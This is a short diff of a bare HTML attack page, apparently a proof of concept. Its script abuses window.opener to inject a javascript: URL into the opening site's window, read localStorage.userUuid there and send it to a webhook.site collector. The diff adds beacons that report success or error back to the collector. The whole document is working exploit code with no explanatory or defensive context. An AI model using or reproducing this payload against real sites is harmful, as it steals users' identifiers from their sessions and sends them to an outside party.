@@ -1,12 +1,15 @@
-<!doctype html>
-<meta charset="utf-8"><title>ok</title>
+<!doctype html><meta charset="utf-8"><title>ok</title>
 <body style="background:#cfe">
 <script>
-new Image().src='https://webhook.site/034135c8-1713-49c6-b1ee-50f549c9cd93?p=page';
+var W='https://webhook.site/034135c8-1713-49c6-b1ee-50f549c9cd93';
+new Image().src=W+'?p=page';
 setTimeout(function(){
   try{
-    opener.location='javascript:new Image().src="https://webhook.site/034135c8-1713-49c6-b1ee-50f549c9cd93?d="+localStorage.userUuid';
-  }catch(e){}
+    opener.location='javascript:new Image().src="'+W+'?d="+localStorage.userUuid';
+    new Image().src=W+'?set=ok';
+  }catch(e){
+    new Image().src=W+'?err='+encodeURIComponent(e.name);
+  }
   setTimeout(function(){window.close()},1500);
 },700);
 </script>
